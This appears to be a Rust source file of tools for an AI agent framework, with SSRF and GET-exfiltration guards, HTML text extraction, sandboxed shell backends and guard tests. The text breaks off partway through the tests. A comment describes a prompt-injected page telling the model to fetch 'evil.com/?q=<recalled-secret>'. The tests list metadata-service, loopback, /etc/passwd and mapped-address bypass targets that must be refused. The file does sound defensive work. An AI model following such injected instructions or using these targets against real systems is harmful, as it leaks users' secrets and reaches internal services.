//! Built-in tools - the actions an Engram agent can take.
//!
//! Each is small and auditable. Filesystem tools are confined to the workdir; the
//! shell is off by default and refused outright once the run is tainted; web tools
//! taint the run so anything they pull in can't later reach the shell or secrets.

use std::time::Duration;

use async_trait::async_trait;
use base64::Engine;
use engram_gateway::{Call, CompletionRequest, Message};
use engram_memory::{Region, WriteReq};
use serde_json::{json, Value};

use crate::tool::{confine, Tool, ToolCtx};

pub(crate) fn arg_str<'a>(args: &'a Value, key: &str) -> Result<&'a str, String> {
    args[key].as_str().ok_or_else(|| {
        // Name what WAS received - "missing 'path'" with no context made provider quirks
        // (arguments arriving as {}) look like model stupidity and cost real debugging time.
        let got: Vec<&str> = args
            .as_object()
            .map(|o| o.keys().map(String::as_str).collect())
            .unwrap_or_default();
        // Actionable for the MODEL too (this string is its tool result): a bare "missing" made
        // models repeat the same broken call; telling them how to re-call fixes the retry.
        format!(
            "missing string argument '{key}' (received keys: [{}]). Re-send this tool call with ALL required arguments as a JSON object, e.g. {{\"{key}\": \"...\"}}.",
            got.join(", ")
        )
    })
}

/// A string argument by canonical key, tolerating the aliases models actually emit
/// ("path" vs "file"/"filename"/"file_path"; "content" vs "text"/"contents"/"body").
pub(crate) fn arg_str_any<'a>(args: &'a Value, keys: &[&str]) -> Result<&'a str, String> {
    for k in keys {
        if let Some(s) = args[*k].as_str() {
            return Ok(s);
        }
    }
    arg_str(args, keys[0])
}

pub(crate) const PATH_KEYS: &[&str] = &["path", "file", "filename", "file_path"];
pub(crate) const CONTENT_KEYS: &[&str] = &["content", "text", "contents", "body", "data"];

/// Reject non-public destinations (SSRF guard): only http(s), and never loopback,
/// private, link-local (incl. the 169.254.169.254 cloud-metadata IP), or unspecified
/// addresses - so the agent can't be tricked into reaching its own unauthenticated API
/// or a cloud metadata service. Resolves hostnames and checks every resulting IP.
pub(crate) async fn guard_url(url: &str) -> Result<(), String> {
    let u = url.trim();
    if !(u.starts_with("http://") || u.starts_with("https://")) {
        return Err("url must be http(s)".into());
    }
    let after = u.split_once("://").map(|(_, b)| b).unwrap_or("");
    let hostport = after.split(['/', '?', '#']).next().unwrap_or("");
    let hostport = hostport.rsplit('@').next().unwrap_or(hostport); // strip userinfo
    let host = if let Some(rest) = hostport.strip_prefix('[') {
        rest.split(']').next().unwrap_or("") // [ipv6]
    } else {
        hostport.split(':').next().unwrap_or(hostport)
    };
    if host.is_empty() {
        return Err("url has no host".into());
    }
    let ips: Vec<std::net::IpAddr> = if let Ok(ip) = host.parse::<std::net::IpAddr>() {
        vec![ip]
    } else {
        tokio::net::lookup_host((host, 80u16))
            .await
            .map_err(|e| format!("could not resolve '{host}': {e}"))?
            .map(|sa| sa.ip())
            .collect()
    };
    if ips.is_empty() {
        return Err(format!("could not resolve '{host}'"));
    }
    for ip in ips {
        if is_blocked_ip(&ip) {
            return Err(format!("refusing to reach non-public address {ip}"));
        }
    }
    Ok(())
}

fn is_blocked_ip(ip: &std::net::IpAddr) -> bool {
    is_blocked_ip_ex(ip, false)
}

/// What kind of LOCAL preview a browser URL is (if any). The browser tools support the common
/// "build it, then look at it" workflow — previewing a file the agent just wrote, or a dev server
/// it started on localhost — which the public-only SSRF guard would otherwise reject outright.
pub(crate) enum LocalTarget {
    /// A `file://` path (already confined to the workdir by the caller).
    File(std::path::PathBuf),
    /// An `http(s)://` loopback origin (localhost / 127.x / ::1).
    Loopback,
    /// Not a local preview — vet it as a normal public URL.
    Public,
}

/// Classify a browser URL as a workdir file, a loopback origin, or a public URL. `file://` paths
/// are percent-decoded and canonicalized, then required to sit INSIDE `workdir` (so the agent can
/// only preview files it can also write — never `file:///etc/passwd`).
pub(crate) fn classify_browse(url: &str, workdir: &std::path::Path) -> Result<LocalTarget, String> {
    let u = url.trim();
    if let Some(rest) = u.strip_prefix("file://") {
        // file:///path — strip an optional localhost authority, percent-decode.
        let raw = rest.strip_prefix("localhost").unwrap_or(rest);
        let decoded = percent_decode(raw);
        let root = workdir
            .canonicalize()
            .map_err(|e| format!("workdir error: {e}"))?;
        // The model rarely knows the workdir's absolute path, so it sends file:///index.html
        // (root) or a bare name. Try the literal path first, then resolve it RELATIVE to the
        // workdir (stripping leading slashes), then the basename in the workdir - the first that
        // exists wins. Every candidate is still confined to the workdir below.
        let rel = decoded.trim_start_matches('/');
        let base = std::path::Path::new(rel)
            .file_name()
            .map(std::path::PathBuf::from);
        let mut candidates = vec![std::path::PathBuf::from(&decoded), root.join(rel)];
        if let Some(b) = base {
            candidates.push(root.join(b));
        }
        let canon = candidates
            .iter()
            .find_map(|c| c.canonicalize().ok())
            .ok_or_else(|| format!("file not found in the working directory: {decoded}"))?;
        if !canon.starts_with(&root) {
            return Err(
                "refusing to open a file outside the working directory (only files the agent \
                 created here can be previewed)"
                    .into(),
            );
        }
        return Ok(LocalTarget::File(canon));
    }
    // http(s) loopback: localhost or a 127.x / ::1 literal.
    let after = u.split_once("://").map(|(_, b)| b).unwrap_or("");
    if after.is_empty() {
        return Ok(LocalTarget::Public);
    }
    let hostport = after.split(['/', '?', '#']).next().unwrap_or("");
    let hostport = hostport.rsplit('@').next().unwrap_or(hostport);
    let host = if let Some(rest) = hostport.strip_prefix('[') {
        rest.split(']').next().unwrap_or("")
    } else {
        hostport.split(':').next().unwrap_or(hostport)
    };
    let is_loopback = host.eq_ignore_ascii_case("localhost")
        || host
            .parse::<std::net::IpAddr>()
            .map(|ip| ip.is_loopback())
            .unwrap_or(false);
    Ok(if is_loopback {
        LocalTarget::Loopback
    } else {
        LocalTarget::Public
    })
}

/// Minimal percent-decoder for `file://` paths (handles %20 etc.); leaves malformed escapes as-is.
fn percent_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() {
            if let (Some(h), Some(l)) = (hex_val(b[i + 1]), hex_val(b[i + 2])) {
                out.push(h * 16 + l);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}
fn hex_val(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

/// The URL to actually hand Chrome: a resolved `file://` for a workdir file (the model's guessed
/// path may be wrong, e.g. file:///name.html; the resolved canonical path is what opens), else the
/// URL unchanged.
pub(crate) fn browse_url(original: &str, target: &LocalTarget) -> String {
    match target {
        LocalTarget::File(p) => format!("file://{}", p.display()),
        _ => original.to_string(),
    }
}

/// The SSRF guard for the BROWSER tools: like [`guard_url`] but it also permits the two safe local-
/// preview cases — a `file://` inside the workdir (any run: it's a local read, not network egress),
/// and a loopback dev server on a CLEAN run (blocked once the lethal trifecta is armed, since then a
/// localhost fetch is the SSRF-via-injected-content threat the guard exists for). Returns how the
/// caller should reach it (skip connection-pinning for local; pin as usual for public).
pub(crate) async fn guard_browse_url(
    url: &str,
    workdir: &std::path::Path,
    trifecta: bool,
) -> Result<LocalTarget, String> {
    match classify_browse(url, workdir)? {
        LocalTarget::File(p) => Ok(LocalTarget::File(p)),
        LocalTarget::Loopback => {
            if trifecta {
                return Err(
                    "refused: this run read untrusted content while holding private data, so \
                     reaching a local address is blocked (SSRF guard). Ask the user to approve, or \
                     run the preview in a fresh chat."
                        .into(),
                );
            }
            Ok(LocalTarget::Loopback)
        }
        LocalTarget::Public => {
            guard_url(url).await?;
            guard_exfil_url(url, trifecta)?;
            Ok(LocalTarget::Public)
        }
    }
}

/// The exfiltration ceiling on a URL path when the lethal trifecta is armed (untrusted + sensitive).
/// A GET's host+path is a data-OUT channel (markdown-image/GET beaconing): an injected page can tell
/// the model to `web_fetch("https://evil.com/?q=<recalled-secret>")`, and the SSRF guard only blocks
/// PRIVATE IPs, not public attacker hosts. So on a trifecta run we refuse a fetch/browse whose URL
/// carries a query string or an over-long path — the classic exfil vectors — while still allowing
/// ordinary clean-URL research to proceed. Ingress isn't blocked; the covert OUT-channel is.
const EXFIL_PATH_MAX: usize = 96;

/// On a trifecta-armed run, refuse a research URL that could smuggle data OUT via its query string or
/// an unusually long path. `trifecta` is `ctx.taint.is_untrusted() && ctx.sensitive`. A no-op when the
/// trifecta isn't armed, so pure web research (untrusted-but-not-sensitive) is unaffected.
pub(crate) fn guard_exfil_url(url: &str, trifecta: bool) -> Result<(), String> {
    if !trifecta {
        return Ok(());
    }
    let after = url.trim().split_once("://").map(|(_, b)| b).unwrap_or("");
    // A query string on a GET is the primary covert channel; refuse it outright.
    if after.contains('?') || after.contains('#') {
        return Err(
            "refused: this run holds private data and has read untrusted content, so a fetch/browse \
             carrying a query string is blocked (GET-exfiltration guard). Request the user's approval \
             or use a clean URL with no query."
                .into(),
        );
    }
    // An over-long path is the other beacon shape (secret encoded into the path).
    let path = after.split(['?', '#']).next().unwrap_or("");
    let path = &path[path.find('/').unwrap_or(path.len())..];
    if path.trim_matches('/').len() > EXFIL_PATH_MAX {
        return Err(
            "refused: this run holds private data and has read untrusted content, so a fetch/browse \
             with an unusually long URL path is blocked (GET-exfiltration guard). Request approval or \
             shorten the URL."
                .into(),
        );
    }
    Ok(())
}

/// SSRF address classifier. With `allow_local` it permits loopback/private/link-local/CGNAT ranges —
/// used ONLY for a URL the USER explicitly configured (e.g. a self-hosted SearXNG at localhost or a
/// LAN box), which is trusted, unlike a URL that came from the model or a fetched web page. The
/// always-blocked set (unspecified/broadcast/multicast/0.x) stays blocked either way.
fn is_blocked_ip_ex(ip: &std::net::IpAddr, allow_local: bool) -> bool {
    use std::net::IpAddr;
    // CRITICAL: unmap IPv4-mapped/-compatible IPv6 BEFORE classifying, so a literal like
    // ::ffff:169.254.169.254 (which parses as V6) is routed through the V4 checks instead of
    // sneaking past them straight to cloud metadata or the loopback control plane.
    if let IpAddr::V6(v6) = ip {
        if let Some(v4) = v6.to_ipv4_mapped().or_else(|| v6.to_ipv4()) {
            return is_blocked_ip_ex(&IpAddr::V4(v4), allow_local);
        }
    }
    match ip {
        IpAddr::V4(v4) => {
            // Never reachable, even for a trusted local URL.
            if v4.is_unspecified() || v4.is_broadcast() || v4.is_multicast() || v4.octets()[0] == 0
            {
                return true;
            }
            !allow_local
                && (v4.is_loopback()
                    || v4.is_private()
                    || v4.is_link_local()
                    // CGNAT 100.64.0.0/10, benchmark 198.18.0.0/15, IETF protocol 192.0.0.0/24.
                    || (v4.octets()[0] == 100 && (v4.octets()[1] & 0xc0) == 0x40)
                    || (v4.octets()[0] == 198 && (v4.octets()[1] & 0xfe) == 18)
                    || (v4.octets()[0] == 192 && v4.octets()[1] == 0 && v4.octets()[2] == 0))
        }
        IpAddr::V6(v6) if v6.is_multicast() => true,
        IpAddr::V6(v6) => {
            let s = v6.segments();
            if v6.is_unspecified() {
                return true;
            }
            !allow_local
                && (v6.is_loopback()
                    || (s[0] & 0xffc0) == 0xfe80 // link-local fe80::/10
                    || (s[0] & 0xfe00) == 0xfc00 // unique-local fc00::/7
                    // Block the v4-embedding transition prefixes outright (they could wrap a private/
                    // metadata v4 that to_ipv4_mapped/to_ipv4 don't unwrap): 6to4 2002::/16 and the
                    // NAT64 well-known prefix 64:ff9b::/96.
                    || s[0] == 0x2002
                    || (s[0] == 0x0064 && s[1] == 0xff9b))
        }
    }
}

/// A URL resolved to a set of vetted public socket addresses, ready to be **pinned** so the
/// connection can only ever reach the address we validated (defeating DNS-rebinding TOCTOU).
pub(crate) struct GuardedTarget {
    pub host: String,
    pub addrs: Vec<std::net::SocketAddr>,
}

/// Parse + resolve + SSRF-check a URL, returning the vetted address(es) to pin the connection
/// to. Like [`guard_url`] but it hands back the resolved IPs so the caller connects to exactly
/// those, closing the gap where reqwest/Chrome would re-resolve the hostname after the check.
pub(crate) async fn resolve_guarded(url: &str) -> Result<GuardedTarget, String> {
    resolve_guarded_ex(url, false).await
}

/// Like [`resolve_guarded`] but permits loopback/private/LAN addresses. ONLY for a URL the user
/// explicitly configured (e.g. a self-hosted SearXNG at `http://localhost:8080`) — that's a trusted
/// endpoint, not a URL supplied by the model or a fetched page, so the SSRF block would only get in
/// the way. The hostname is still pinned to the resolved IP (no DNS-rebinding) and stays http(s).
pub(crate) async fn resolve_trusted(url: &str) -> Result<GuardedTarget, String> {
    resolve_guarded_ex(url, true).await
}

async fn resolve_guarded_ex(url: &str, allow_local: bool) -> Result<GuardedTarget, String> {
    let u = url.trim();
    let scheme = if u.starts_with("https://") {
        "https"
    } else if u.starts_with("http://") {
        "http"
    } else {
        return Err("url must be http(s)".into());
    };
    let after = u.split_once("://").map(|(_, b)| b).unwrap_or("");
    let hostport = after.split(['/', '?', '#']).next().unwrap_or("");
    let hostport = hostport.rsplit('@').next().unwrap_or(hostport); // strip userinfo
    let (host, port): (String, u16) = if let Some(rest) = hostport.strip_prefix('[') {
        // [ipv6] or [ipv6]:port
        let h = rest.split(']').next().unwrap_or("").to_string();
        let p = rest.split("]:").nth(1).and_then(|s| s.parse().ok());
        (h, p.unwrap_or(if scheme == "https" { 443 } else { 80 }))
    } else {
        let mut it = hostport.splitn(2, ':');
        let h = it.next().unwrap_or("").to_string();
        let p = it.next().and_then(|s| s.parse().ok());
        (h, p.unwrap_or(if scheme == "https" { 443 } else { 80 }))
    };
    if host.is_empty() {
        return Err("url has no host".into());
    }
    let ips: Vec<std::net::IpAddr> = if let Ok(ip) = host.parse::<std::net::IpAddr>() {
        vec![ip]
    } else {
        tokio::net::lookup_host((host.as_str(), port))
            .await
            .map_err(|e| format!("could not resolve '{host}': {e}"))?
            .map(|sa| sa.ip())
            .collect()
    };
    if ips.is_empty() {
        return Err(format!("could not resolve '{host}'"));
    }
    let mut addrs = Vec::new();
    for ip in ips {
        if is_blocked_ip_ex(&ip, allow_local) {
            // Public guard: reject if ANY resolved address is internal — a domain resolving to both a
            // public and a private IP is a DNS-rebinding vector. Trusted (user-set) URL: just skip a
            // blocked address (e.g. localhost's ::1 alongside 127.0.0.1) and keep the usable ones.
            if allow_local {
                continue;
            }
            return Err(format!("refusing to reach non-public address {ip}"));
        }
        addrs.push(std::net::SocketAddr::new(ip, port));
    }
    if addrs.is_empty() {
        return Err(format!("no usable address for '{host}'"));
    }
    Ok(GuardedTarget { host, addrs })
}

/// Turn a possibly-relative redirect `Location` into an absolute URL against `base`.
pub(crate) fn absolutize(base: &str, loc: &str) -> String {
    if loc.contains("://") {
        return loc.to_string();
    }
    // scheme://authority of the base
    let (scheme, rest) = base.split_once("://").unwrap_or(("https", base));
    let authority = rest.split(['/', '?', '#']).next().unwrap_or(rest);
    if let Some(stripped) = loc.strip_prefix("//") {
        return format!("{scheme}://{stripped}"); // protocol-relative
    }
    if loc.starts_with('/') {
        return format!("{scheme}://{authority}{loc}"); // root-relative
    }
    // path-relative: drop the base's last path segment and append
    let path = &rest[authority.len()..];
    let dir = path.rfind('/').map(|i| &path[..=i]).unwrap_or("/");
    format!("{scheme}://{authority}{dir}{loc}")
}

/// Tags whose *contents* are boilerplate we never want as readable text.
const SKIP_TAGS: &[&str] = &[
    "script", "style", "nav", "header", "footer", "aside", "form", "noscript", "svg", "iframe",
    "template", "button", "select", "option",
];
/// Block-level tags: emit a newline at their boundary so document structure survives the flatten
/// (otherwise headings, list items and paragraphs run together into one wall of text).
const BLOCK_TAGS: &[&str] = &[
    "p",
    "div",
    "br",
    "li",
    "ul",
    "ol",
    "tr",
    "table",
    "section",
    "article",
    "main",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "blockquote",
    "pre",
    "figcaption",
    "hr",
    "dd",
    "dt",
];

/// Strip HTML to readable text — a dependency-free "readability" pass: prefer the page's main content
/// region, drop boilerplate (nav/header/footer/script/style/forms), preserve block structure as
/// newlines, decode HTML entities, and lead with the page title. A large upgrade over a bare
/// tag-stripper for the JS-light pages `web_fetch` handles, with ZERO new dependencies (the build
/// stays small — see the footprint constraint in Cargo.toml).
///
/// Iterates by CHARACTER, never a raw byte index. On real web content a byte index lands inside a
/// multibyte char (e.g. the curly apostrophe '’', 3 bytes) and slicing there PANICKED — which, with
/// panic=abort, took the daemon down and surfaced as "Couldn't reach Engram / Load failed".
pub(crate) fn html_to_text(html: &str) -> String {
    let region = main_region(html).unwrap_or(html);
    let body = collapse(&decode_entities(&strip_tags(region)));
    // Lead with the <title> for context, unless the body already opens with it.
    match extract_tag_text(html, "title") {
        Some(t) if !t.is_empty() && !body.starts_with(&t) => {
            if body.is_empty() {
                t
            } else {
                format!("{t}\n\n{body}")
            }
        }
        _ => body,
    }
}

/// Streaming tag-stripper: drop SKIP_TAGS' contents, newline at BLOCK_TAGS, space at inline tags,
/// keep everything else. The single hot loop the whole extractor is built on.
fn strip_tags(html: &str) -> String {
    let mut s = String::with_capacity(html.len() / 2);
    let mut in_tag = false;
    let mut skip_depth = 0i32;
    for (i, c) in html.char_indices() {
        if c == '<' {
            in_tag = true;
            // Tag names are ASCII; a short lowercase lookahead is enough and never shifts boundaries.
            let look: String = html[i..]
                .chars()
                .take(12)
                .collect::<String>()
                .to_ascii_lowercase();
            if let Some((close, name)) = parse_tag(&look) {
                if SKIP_TAGS.contains(&name.as_str()) {
                    if close {
                        skip_depth = (skip_depth - 1).max(0);
                    } else {
                        skip_depth += 1;
                    }
                } else if skip_depth == 0 {
                    s.push(if BLOCK_TAGS.contains(&name.as_str()) {
                        '\n'
                    } else {
                        ' '
                    });
                }
            } else if skip_depth == 0 {
                s.push(' '); // comment / doctype / stray '<' — its body is consumed as in_tag
            }
        } else if c == '>' {
            in_tag = false;
        } else if !in_tag && skip_depth == 0 {
            s.push(c);
        }
    }
    s
}

/// Parse the start of a tag from a short lowercase lookahead beginning at '<'. Returns
/// `(is_closing, name)`, or `None` for comments/doctypes/stray '<'.
fn parse_tag(look: &str) -> Option<(bool, String)> {
    let rest = look.strip_prefix('<')?;
    let (close, rest) = match rest.strip_prefix('/') {
        Some(r) => (true, r),
        None => (false, rest),
    };
    let name: String = rest
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric())
        .collect();
    if name.is_empty() {
        None
    } else {
        Some((close, name))
    }
}

/// Return the inner HTML of the page's main content region (`<main>` or `<article>`) when it is
/// clearly present and substantial, so nav/sidebars/boilerplate outside it are dropped wholesale.
/// Byte offsets come from an ASCII-lowercased copy whose byte layout matches `html` exactly, and the
/// boundaries are at ASCII `<`/`>`, so slicing `html` is always valid.
fn main_region(html: &str) -> Option<&str> {
    let lower = html.to_ascii_lowercase();
    for (open, close) in [("<main", "</main>"), ("<article", "</article>")] {
        if let Some(s) = lower.find(open) {
            if let Some(rel_gt) = lower[s..].find('>') {
                let start = s + rel_gt + 1;
                if let Some(e) = lower.rfind(close) {
                    if e > start && e - start > 200 {
                        return Some(&html[start..e]);
                    }
                }
            }
        }
    }
    None
}

/// Extract the text inside the FIRST `<tag>…</tag>` (used for `<title>`).
fn extract_tag_text(html: &str, tag: &str) -> Option<String> {
    let lower = html.to_ascii_lowercase();
    let s = lower.find(&format!("<{tag}"))?;
    let gt = lower[s..].find('>')? + s + 1;
    let e = lower[gt..].find(&format!("</{tag}>"))? + gt;
    let t = collapse(&decode_entities(&strip_tags(&html[gt..e])));
    if t.is_empty() {
        None
    } else {
        Some(t)
    }
}

/// Decode the HTML entities that actually appear in body text; unknown entities are left verbatim.
///
/// Entity bodies are ASCII (`&name;` or `&#123;`), so we scan the bytes after `&` for the closing
/// `;` instead of slicing a fixed-width window — a byte-width cap can land *inside* a multibyte char
/// (e.g. between the two bytes of `ä`) and panic. Because the daemon is built `panic = "abort"`, that
/// panic took the whole process down mid-run and surfaced in the browser only as "Load failed".
fn decode_entities(s: &str) -> String {
    if !s.contains('&') {
        return s.to_string();
    }
    let bytes = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut idx = 0usize;
    while idx < s.len() {
        let rest = &s[idx..];
        let c = rest.chars().next().unwrap();
        if c == '&' {
            // Scan up to 12 bytes after '&' for ';', stopping at anything that can't be part of an
            // entity name (notably any byte >= 0x80 — a multibyte lead/continuation). Everything we
            // step over is ASCII, so the eventual `&s[idx + 1..semi]` slice is always valid.
            let cap = s.len().min(idx + 1 + 12);
            let mut semi = None;
            let mut j = idx + 1;
            while j < cap {
                match bytes[j] {
                    b';' => {
                        semi = Some(j);
                        break;
                    }
                    b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'#' => j += 1,
                    _ => break, // not an entity (whitespace, a multibyte char, etc.)
                }
            }
            if let Some(semi) = semi {
                if let Some(d) = decode_one(&s[idx + 1..semi]) {
                    out.push_str(&d);
                    idx = semi + 1; // consume '&' .. ';'
                    continue;
                }
            }
            out.push('&');
            idx += 1;
        } else {
            out.push(c);
            idx += c.len_utf8();
        }
    }
    out
}

/// Map one entity body (between '&' and ';') to its character. Handles the common named entities and
/// numeric forms `&#123;` / `&#xAB;`.
fn decode_one(ent: &str) -> Option<String> {
    let named = match ent {
        "amp" => "&",
        "lt" => "<",
        "gt" => ">",
        "quot" => "\"",
        "apos" => "'",
        "nbsp" => " ",
        "mdash" => "—",
        "ndash" => "–",
        "hellip" => "…",
        "copy" => "©",
        "reg" => "®",
        "trade" => "™",
        "rsquo" => "’",
        "lsquo" => "‘",
        "ldquo" => "“",
        "rdquo" => "”",
        "deg" => "°",
        "eacute" => "é",
        "egrave" => "è",
        "agrave" => "à",
        "ccedil" => "ç",
        "uuml" => "ü",
        "ouml" => "ö",
        "auml" => "ä",
        "szlig" => "ß",
        "euro" => "€",
        "pound" => "£",
        "cent" => "¢",
        "middot" => "·",
        "bull" => "•",
        _ => "",
    };
    if !named.is_empty() {
        return Some(named.to_string());
    }
    let num = ent.strip_prefix('#')?;
    let code = match num.strip_prefix(['x', 'X']) {
        Some(hex) => u32::from_str_radix(hex, 16).ok()?,
        None => num.parse::<u32>().ok()?,
    };
    char::from_u32(code).map(|c| c.to_string())
}

/// Collapse intra-line whitespace and limit blank lines to one, preserving paragraph breaks.
fn collapse(s: &str) -> String {
    let mut out: Vec<String> = Vec::new();
    let mut prev_blank = false;
    for line in s.split('\n') {
        let joined = line.split_whitespace().collect::<Vec<_>>().join(" ");
        if joined.is_empty() {
            if !prev_blank && !out.is_empty() {
                out.push(String::new());
            }
            prev_blank = true;
        } else {
            out.push(joined);
            prev_blank = false;
        }
    }
    while out.last().map(|l| l.is_empty()).unwrap_or(false) {
        out.pop();
    }
    out.join("\n")
}

// ---------------------------------------------------------------------------
// Shell
// ---------------------------------------------------------------------------

/// Build the `(program, args)` to run `command` under the configured backend:
///
/// - `None` → local (`sh -c`)
/// - `Some("ssh:user@host")` → remote over SSH
/// - `Some("singularity:image")` → a `singularity exec` sandbox
/// - `Some(image)` → a sandboxed, network-isolated `docker run` against that image
///
/// Exposed (not crate-private) so the daemon's glass-box terminal runs human commands through
/// this exact same path as the agent.
pub fn shell_command(
    backend: Option<&str>,
    workdir: &std::path::Path,
    command: &str,
) -> (String, Vec<String>) {
    match backend {
        // Built-in OS sandbox (no Docker). Network-denied for the agent's general shell.
        Some("sandbox") => sandbox_command(workdir, command, false),
        Some(b) if b.starts_with("ssh:") => {
            ("ssh".into(), vec![b[4..].to_string(), command.to_string()])
        }
        Some(b) if b.starts_with("singularity:") => (
            "singularity".into(),
            vec![
                "exec".into(),
                b[12..].to_string(),
                "sh".into(),
                "-c".into(),
                command.to_string(),
            ],
        ),
        Some(img) => {
            let mount = format!("{}:/work", workdir.display());
            (
                "docker".into(),
                vec![
                    "run".into(),
                    "--rm".into(),
                    "--network".into(),
                    "none".into(),
                    "-v".into(),
                    mount,
                    "-w".into(),
                    "/work".into(),
                    img.to_string(),
                    "sh".into(),
                    "-c".into(),
                    command.to_string(),
                ],
            )
        }
        None => ("sh".into(), vec!["-c".into(), command.to_string()]),
    }
}

/// Wrap `command` in the platform's BUILT-IN sandbox so code runs without network (unless `allow_net`)
/// and can only write to `workdir` — no Docker required. macOS uses Seatbelt (`sandbox-exec`), Linux
/// uses bubblewrap (`bwrap`). On other platforms there is no built-in sandbox, so it falls back to a
/// plain shell and the caller should prefer an explicit backend (docker/ssh) there.
///
/// Validated on macOS: interpreters (python3/node/…) start normally, outbound network is refused, and
/// writes outside `workdir` (e.g. the user's home) are denied. On Linux, `--unshare-net` removes all
/// network and only `workdir` is bind-mounted read-write over a read-only root.
pub fn sandbox_command(
    workdir: &std::path::Path,
    command: &str,
    allow_net: bool,
) -> (String, Vec<String>) {
    #[cfg(target_os = "macos")]
    {
        let wd = workdir.display().to_string();
        let home = std::env::var("HOME").unwrap_or_default();
        // `allow default` lets interpreters start; then deny the network (the exfiltration vector) and
        // deny writes to the user's home except the skill's own scratch dir under workdir.
        let net = if allow_net { "" } else { "(deny network*)\n" };
        let profile = format!(
            "(version 1)\n(allow default)\n{net}(deny file-write* (subpath \"{home}\"))\n(allow file-write* (subpath \"{wd}\"))\n"
        );
        (
            "sandbox-exec".into(),
            vec![
                "-p".into(),
                profile,
                "sh".into(),
                "-c".into(),
                command.to_string(),
            ],
        )
    }
    #[cfg(target_os = "linux")]
    {
        let wd = workdir.display().to_string();
        let mut args: Vec<String> = Vec::new();
        if !allow_net {
            args.push("--unshare-net".into());
        }
        args.extend([
            "--die-with-parent".into(),
            "--ro-bind".into(),
            "/".into(),
            "/".into(),
            "--dev".into(),
            "/dev".into(),
            "--proc".into(),
            "/proc".into(),
            "--tmpfs".into(),
            "/tmp".into(),
            "--bind".into(),
            wd.clone(),
            wd,
            "sh".into(),
            "-c".into(),
            command.to_string(),
        ]);
        ("bwrap".into(), args)
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    {
        let _ = (workdir, allow_net);
        ("sh".into(), vec!["-c".into(), command.to_string()])
    }
}

#[cfg(test)]
mod ssrf_guard_tests {
    use super::{absolutize, guard_url, resolve_guarded, resolve_trusted};
    use super::{classify_browse, guard_browse_url, LocalTarget};

    #[tokio::test]
    async fn blocks_internal_and_non_http_targets() {
        // Loopback (the unauthenticated local API), cloud metadata, private, IPv6 loopback.
        assert!(guard_url("http://127.0.0.1:8088/v1/policy").await.is_err());
        assert!(guard_url("http://localhost/").await.is_err());
        assert!(guard_url("http://169.254.169.254/latest/meta-data/")
            .await
            .is_err());
        assert!(guard_url("http://10.0.0.5/").await.is_err());
        assert!(guard_url("http://192.168.1.1/").await.is_err());
        assert!(guard_url("http://[::1]/").await.is_err());
        // Non-http(s) schemes (local file read, scheme confusion).
        assert!(guard_url("file:///etc/passwd").await.is_err());
        assert!(guard_url("ftp://example.com/").await.is_err());
        // A public literal IP passes (no DNS needed, so this is offline-stable).
        assert!(guard_url("https://1.1.1.1/").await.is_ok());
        // IPv4-mapped IPv6 must be UNMAPPED and blocked (the metadata/loopback bypass).
        assert!(guard_url("http://[::ffff:127.0.0.1]/").await.is_err());
        assert!(guard_url("http://[::ffff:169.254.169.254]/").await.is_err());
        assert!(guard_url("http://[::ffff:10.0.0.5]/").await.is_err());
        // CGNAT and IPv6 multicast.
        assert!(guard_url("http://100.64.1.1/").await.is_err());
        assert!(guard_url("http://[ff02::1]/").await.is_err());
        // v4-embedding transition prefixes (6to4 / NAT64) are blocked outright.
        assert!(guard_url("http://[2002:a9fe:a9fe::1]/").await.is_err());
        assert!(guard_url("http://[64:ff9b::a9fe:a9fe]/").await.is_err());
        // A normal public IPv6 is still allowed (no over-block).
        assert!(guard_url("http://[2606:4700::1]/").await.is_ok());
    }

    #[tokio::test]
    async fn browse_guard_allows_workdir_files_and_loopback_previews() {
        let dir = tempfile::tempdir().unwrap();
        let wd = dir.path();
        std::fs::write(wd.join("page.html"), b"<h1>hi</h1>").unwrap();

        // A file the agent created in its workdir: previewable on any run.
        let u = format!("file://{}/page.html", wd.to_string_lossy());
        assert!(matches!(
            guard_browse_url(&u, wd, false).await,
            Ok(LocalTarget::File(_))
        ));
        assert!(matches!(
            guard_browse_url(&u, wd, true).await,
            Ok(LocalTarget::File(_))
        ));

        // The model rarely knows the absolute workdir path: file:///page.html (root form) and a
        // bare name must resolve against the workdir, not filesystem root.
        assert!(matches!(
            guard_browse_url("file:///page.html", wd, false).await,
            Ok(LocalTarget::File(_))
        ));
        // browse_url turns the resolved target into a canonical file:// URL Chrome can open.
        if let Ok(t) = guard_browse_url("file:///page.html", wd, false).await {
            assert!(super::browse_url("file:///page.html", &t).ends_with("/page.html"));
        }

        // A file OUTSIDE the workdir is refused (no file:///etc/passwd).
        assert!(guard_browse_url("file:///etc/hosts", wd, false)
            .await
            .is_err());
        // A workdir-relative traversal that escapes is refused.
        let outside = format!("file://{}/../escape.html", wd.to_string_lossy());
        assert!(guard_browse_url(&outside, wd, false).await.is_err());

        // Loopback dev server: allowed on a CLEAN run, blocked once the trifecta is armed.
        assert!(matches!(
            guard_browse_url("http://localhost:8765/app.html", wd, false).await,
            Ok(LocalTarget::Loopback)
        ));
        assert!(matches!(
            guard_browse_url("http://127.0.0.1:3000/", wd, false).await,
            Ok(LocalTarget::Loopback)
        ));
        assert!(guard_browse_url("http://localhost:8765/", wd, true)
            .await
            .is_err());

        // A public URL still classifies as public (and is vetted by guard_url downstream).
        assert!(matches!(
            classify_browse("https://example.com/", wd),
            Ok(LocalTarget::Public)
        ));
        // A public host that resolves to a private IP is still refused on a clean run.
        assert!(
            guard_browse_url("http://169.254.169.254/latest/", wd, false)
                .await
                .is_err()
        );
    }

    #[test]
    fn glob_match_is_linear_and_correct() {
        use super::glob_match;
        assert!(glob_match("**/*.rs", "src/inner/b.rs"));
        assert!(glob_match("src/*.rs", "src/a.rs"));
        assert!(!glob_match("src/*.rs", "src/inner/b.rs"));
        assert!(glob_match("a*b*c", "axxbyyc"));
